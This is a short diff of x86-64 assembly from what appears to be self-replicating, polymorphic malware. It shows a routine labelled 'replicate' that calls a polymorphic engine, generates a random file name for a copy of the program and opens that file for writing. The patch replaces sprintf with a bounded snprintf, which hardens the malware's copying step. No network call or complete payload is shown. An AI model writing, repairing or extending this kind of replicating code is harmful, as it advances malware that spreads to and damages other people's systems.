@@ -11,7 +11,7 @@ extern fread
 extern fwrite
 extern malloc
 extern free
-extern sprintf
+extern snprintf
 extern memset
 extern memcpy
 
@@ -253,10 +253,11 @@ replicate:
 	call    polymorphic_engine
 	; generate filename of the copy
 	call    lcg_rand32
-	mov     r8d, eax
+	mov     r9d, eax
 	lea     rcx, [rbp-0x20]
-	lea     rdx, [rel file_format]
-	call    sprintf
+	mov     rdx, 0x20
+	lea     r8, [rel file_format]
+	call    snprintf
 	; open the copy file
 	lea     rcx, [rbp-0x20]
 	lea     rdx, [rel wb_mode]
